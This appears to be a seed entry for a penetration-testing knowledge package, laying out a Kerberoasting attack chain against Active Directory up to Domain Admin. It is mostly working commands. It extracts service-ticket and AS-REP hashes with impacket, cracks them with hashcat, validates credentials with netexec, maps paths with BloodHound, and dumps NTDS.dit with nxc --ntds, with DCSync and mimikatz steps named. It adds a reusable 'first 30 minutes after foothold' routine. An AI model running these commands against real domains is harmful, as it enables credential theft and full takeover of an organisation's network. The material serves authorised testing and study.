# [Seed] Kerberoasting → Offline cracking → DA

## Scene classification
Penetration Testing/AD Attack

## Goal Overview
There is a common domain user credential. There is a service account configured with SPN in the target domain. TGS is obtained through Kerberoasting for offline blasting. After cracking the clear text password, the BloodHound path is directly connected to the DA.

## Complete execution link

1. Based in the domain (any ordinary user, no local administrator required)
2. Enumerate SPNs
```bash
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
```
3. Check which accounts are assigned SPNs (usually SQL Server/IIS/custom service accounts)
4. Offline cracking
```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
5. Determine the password of a certain svc account → BloodHound to check the reachable path of this account
6. If the account is in the Tier 0 group (Domain Admins / Server Operators / Backup Operators) → Direct DCSync
7. If you are not there but can access a key machine RDP/WinRM → go in and use mimikatz dump to chain to DA

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| GetUserSPNs returns nothing | The current user does not have read SPN permissions | Any ordinary domain user can; it may be that -dc-ip is wrong or PreAuth is not passed | 20min |
| Cracked for several hours to no avail | Password strength is high | 1) Change dictionary (rockyou.txt + corp keywords) 2) Use GPU (hashcat -d 1) 3) Try OneRuleToRuleThemAll rule set | Several hours |
| Failed to log in after getting the password | The credentials have expired or are case-sensitive | Verify with nxc first: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | GPO/ACL is missing during data collection | `bloodhound-python -c All` must bring All; the new version of BHCE recommends `--zip` | 30min |
| AS-REP Roasting did not find the target | There are few accounts with "Do not require Kerberos preauth" set | Use `GetNPUsers.py` to run alone: ` -usersfile users.txt -no-pass` | 15min |

## Toolchain discovery

- **impacket-GetUserSPNs** is already a de facto standard, more cross-platform than PowerView
- **netexec (nxc)** is the successor of CrackMapExec. It is fast and comes with spider_plus / lsassy / ntds and other modules.
- **BloodHound Community Edition (BHCE)** is the new version, much faster than the old BloodHound
- **OneRuleToRuleThemAll** rule set is the best for password blasting
- **bloodyAD** is a new generation AD tool that specializes in "low-privilege use of ACL to escalate privileges"

## Key code/command

Complete Kerberoasting process:

```bash
# 1. Verify Credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. AS-REP A Quick Hit
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Offline Brute Force
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. Use BloodHound after obtaining the password
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find the path: Mark the svc account as Owned, see the Shortest Path to DA
```

If the svc account can access SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# Directly dump NTDS.dit
```

## Suggestions for improving this package

- `pentest-tools/references/network-attack-defense.md` should have a full chapter on Kerberoasting
- BloodHound CE is already mainstream, bootstrap-manifest should explicitly install `bloodhound-ce-cli`
- Added `pentest-tools/references/ad-cheatsheet.md` to handle 6 major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on one page

## Reusable patterns/script snippets

**Standard actions 30 minutes after establishing a foothold in the domain**:

```text
1. nxc smb verification credentials + automatic spider sharing
2. GetUserSPNs + GetNPUsers all in one
3. bloodhound-python -c All collection
4. Simultaneous offline blasting (GPU running)
5. Check Tier 0 / Pre-built attack paths while waiting through BloodHound
6. Break the password → Mark Owned → Check the path again
```

**AD Kerberos hashcat mode speedcheck**：

| Mode | Purpose |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 (caught by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution action
- [ ] Add ad-cheatsheet.md
- [ ] tool-index Check nxc / bloodhound-ce / bloodyAD status
- [x] Routing matrix already contains Kerberos / Kerberoasting

## Environment information
- Kali 2026.x，impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: Any foothold in the domain (ordinary domain users)

## Desensitization requirements
This entry is seed data, written based on the public AD attack technology model, and does not involve the real target domain.